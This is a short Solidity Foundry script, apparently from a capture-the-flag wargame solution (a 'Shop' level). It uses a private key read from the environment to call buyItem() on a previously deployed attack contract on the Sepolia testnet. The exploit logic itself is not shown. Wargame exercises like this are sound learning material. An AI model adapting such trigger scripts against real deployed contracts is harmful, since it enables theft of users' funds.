// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// Attack  contract address: "0x046FEC12eEb2be47Fa022477687de4Ade9a29618"

interface IAttack {
    function buyItem() external;
}

contract TriggerAttack is Script {
    IAttack public attack;

    address attackAddr = 0x046FEC12eEb2be47Fa022477687de4Ade9a29618;

    // address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        // Connect to Shop contract
        vm.startBroadcast(privateKey);
        attack = IAttack(attackAddr);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        attack.buyItem();
        vm.stopBroadcast();
    }
}
// */
// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
